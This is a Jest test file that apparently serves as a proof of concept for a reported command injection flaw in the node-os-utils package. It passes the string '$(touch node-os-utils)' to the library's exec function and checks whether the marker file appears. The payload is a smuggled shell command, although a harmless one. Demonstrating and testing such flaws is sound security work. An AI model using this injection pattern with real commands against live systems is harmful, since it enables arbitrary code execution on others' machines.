//https://github.com/SunilWang/node-os-utils/issues/2
test("Remote code execution in node-os-utils", (done) => {
  expect.assertions(2);
  const nodeosutils = require("node-os-utils");
  const fs = require("fs");
  const path = "./node-os-utils";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let command = "$(touch node-os-utils)";
  function dummySource(val) {
    command += val;
  }
  dummySource(" ");
  try {
    let exec = nodeosutils.exec;
    exec(command)();
  } catch (error) {}

  // setTimeout(() => {
  //   file_exist = fs.existsSync(path);
  //   expect(file_exist).toBe(true);
  //   fs.unlink(path, () => {done();});
  // }, 5000);

  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
